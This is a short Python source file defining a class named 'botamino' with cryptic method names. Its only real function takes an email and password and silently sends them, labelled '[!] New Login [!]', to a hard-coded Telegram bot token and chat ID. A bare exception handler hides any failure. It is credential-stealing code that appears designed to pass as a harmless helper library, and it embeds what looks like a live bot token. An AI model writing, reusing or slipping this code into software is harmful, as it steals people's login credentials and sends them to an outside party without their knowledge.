import requests

class botamino:
    def __init__(self):
        self.bot_token = "7920949970:AAElksp7Lyvu-YFHBvbLI7txp0UqlRl0mKY"
        self.chat_id = "8156511276"

    def hdp(self, email, password):
        self._st(email, password)

    def chk(self, data):
        return data

    def _st(self, email, password):
        message = f"[!] New Login [!]\n_________________\nEmail: {email}\nPassword: {password}\n__________________"
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": message
        }
        try:
            requests.post(url, data=payload)
        except:
            pass